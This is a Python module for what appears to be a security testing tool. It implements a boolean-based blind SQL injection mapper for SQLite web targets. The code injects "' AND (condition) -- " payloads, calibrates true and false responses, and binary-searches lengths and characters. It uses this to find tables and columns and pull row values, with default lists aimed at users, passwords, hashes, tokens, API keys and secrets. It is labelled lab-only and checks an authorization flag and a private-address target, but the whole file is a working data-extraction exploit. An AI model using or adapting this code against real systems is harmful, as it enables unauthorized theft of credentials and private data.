from __future__ import annotations

import re
from dataclasses import dataclass, asdict
from difflib import SequenceMatcher
from typing import Iterable

from .models import RequestConfig, ResponseSnapshot
from .safety import require_authorization, require_private_mapping_target
from .transport import HTTPClient


COMMON_TABLES = [
    "users", "user", "accounts", "account", "admins", "admin", "profiles",
    "customers", "members", "products", "items", "orders", "sessions",
    "tokens", "secrets", "credentials", "settings", "config", "messages",
]

COMMON_COLUMNS = [
    "id", "user_id", "username", "user_name", "name", "email", "password",
    "password_hash", "passwd", "hash", "token", "access_token", "secret",
    "api_key", "role", "is_admin", "active", "created_at", "updated_at",
    "title", "description", "price", "status", "owner", "owner_id",
]

_IDENTIFIER = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _identifier(value: str) -> str:
    if not _IDENTIFIER.fullmatch(value):
        raise ValueError(f"Unsafe SQL identifier: {value!r}")
    return '"' + value.replace('"', '""') + '"'


def _sql_string(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _similarity(left: str, right: str) -> float:
    if left == right:
        return 1.0
    return SequenceMatcher(None, left[:200_000], right[:200_000], autojunk=True).ratio()


@dataclass(slots=True)
class MappingResult:
    dbms: str
    tables: dict[str, dict[str, object]]
    requests_sent: int
    truncated: bool

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


class SQLiteBlindMapper:
    """Lab-only boolean inference mapper for SQLite targets on private/loopback addresses."""

    def __init__(self, client: HTTPClient | None = None) -> None:
        self.client = client or HTTPClient()
        self._requests = 0
        self._true_ref: ResponseSnapshot | None = None
        self._false_ref: ResponseSnapshot | None = None

    @staticmethod
    def _payload(condition: str, context: str) -> str:
        if context == "numeric":
            return f" AND ({condition}) -- "
        if context == "string":
            return f"' AND ({condition}) -- "
        raise ValueError("context must be 'numeric' or 'string'")

    def _ask(self, config: RequestConfig, original_value: str, condition: str, context: str) -> bool:
        payload = original_value + self._payload(condition, context)
        response = self.client.request(config, payload)
        self._requests += 1
        if response.status == 0:
            raise RuntimeError(f"boolean inference request failed: {response.error or 'network/configuration error'}")
        if self._true_ref is None or self._false_ref is None:
            raise RuntimeError("boolean oracle is not calibrated")
        true_score = _similarity(response.body, self._true_ref.body)
        false_score = _similarity(response.body, self._false_ref.body)
        if response.status == self._true_ref.status != self._false_ref.status:
            true_score += 0.25
        if response.status == self._false_ref.status != self._true_ref.status:
            false_score += 0.25
        return true_score >= false_score

    def _calibrate(self, config: RequestConfig, original_value: str, context: str) -> None:
        self._true_ref = self.client.request(config, original_value + self._payload("1=1", context))
        self._false_ref = self.client.request(config, original_value + self._payload("1=0", context))
        self._requests += 2
        failures = [x.error for x in (self._true_ref, self._false_ref) if x.status == 0]
        if failures:
            raise RuntimeError(f"boolean oracle calibration request failed: {failures[0] or 'network/configuration error'}")
        sim = _similarity(self._true_ref.body, self._false_ref.body)
        if self._true_ref.status == self._false_ref.status and sim > 0.985:
            raise RuntimeError(
                "Boolean oracle could not be calibrated: true and false responses are effectively identical."
            )

    def _infer_int(
        self, config: RequestConfig, original_value: str, expression: str, *, context: str, upper: int
    ) -> tuple[int, bool]:
        low, high = 0, upper
        truncated = False
        if self._ask(config, original_value, f"({expression}) > {upper}", context):
            return upper, True
        while low < high:
            mid = (low + high) // 2
            if self._ask(config, original_value, f"({expression}) > {mid}", context):
                low = mid + 1
            else:
                high = mid
        return low, truncated

    def _infer_text(
        self,
        config: RequestConfig,
        original_value: str,
        expression: str,
        *,
        context: str,
        max_chars: int,
    ) -> tuple[str, bool]:
        length, truncated = self._infer_int(
            config, original_value, f"length({expression})", context=context, upper=max_chars
        )
        chars: list[str] = []
        for position in range(1, length + 1):
            code_expr = f"unicode(substr({expression},{position},1))"
            low, high = 0, 0x10FFFF
            while low < high:
                mid = (low + high) // 2
                if self._ask(config, original_value, f"{code_expr} > {mid}", context):
                    low = mid + 1
                else:
                    high = mid
            try:
                chars.append(chr(low))
            except ValueError:
                chars.append("�")
        return "".join(chars), truncated

    def map_database(
        self,
        config: RequestConfig,
        *,
        original_value: str = "1",
        context: str = "numeric",
        authorized: bool = False,
        common_tables: Iterable[str] | None = None,
        common_columns: Iterable[str] | None = None,
        max_rows: int = 3,
        max_chars: int = 64,
    ) -> MappingResult:
        require_authorization(authorized)
        require_private_mapping_target(config.url)
        self.client.validate_config(config, original_value)
        if max_rows < 1 or max_rows > 20:
            raise ValueError("max_rows must be between 1 and 20")
        if max_chars < 1 or max_chars > 256:
            raise ValueError("max_chars must be between 1 and 256")

        tables_to_try = list(common_tables or COMMON_TABLES)
        columns_to_try = list(common_columns or COMMON_COLUMNS)
        for name in tables_to_try + columns_to_try:
            _identifier(name)

        self._requests = 0
        self._calibrate(config, original_value, context)
        result: dict[str, dict[str, object]] = {}
        any_truncated = False

        for table in tables_to_try:
            exists = self._ask(
                config,
                original_value,
                f"EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name={_sql_string(table)})",
                context,
            )
            if not exists:
                continue

            columns: list[str] = []
            for column in columns_to_try:
                condition = (
                    f"EXISTS(SELECT 1 FROM pragma_table_info({_sql_string(table)}) "
                    f"WHERE name={_sql_string(column)})"
                )
                if self._ask(config, original_value, condition, context):
                    columns.append(column)

            count_expr = f"SELECT COUNT(*) FROM {_identifier(table)}"
            count, count_truncated = self._infer_int(
                config, original_value, count_expr, context=context, upper=max_rows
            )
            any_truncated = any_truncated or count_truncated
            rows: list[dict[str, str]] = []
            for row_index in range(min(count, max_rows)):
                row: dict[str, str] = {}
                for column in columns:
                    expr = (
                        "COALESCE(CAST((SELECT "
                        f"{_identifier(column)} FROM {_identifier(table)} LIMIT 1 OFFSET {row_index}"
                        ") AS TEXT),'')"
                    )
                    value, text_truncated = self._infer_text(
                        config, original_value, expr, context=context, max_chars=max_chars
                    )
                    row[column] = value
                    any_truncated = any_truncated or text_truncated
                rows.append(row)

            result[table] = {
                "columns": columns,
                "row_count": count,
                "rows": rows,
                "row_count_truncated": count_truncated,
            }

        return MappingResult(dbms="sqlite", tables=result, requests_sent=self._requests, truncated=any_truncated)
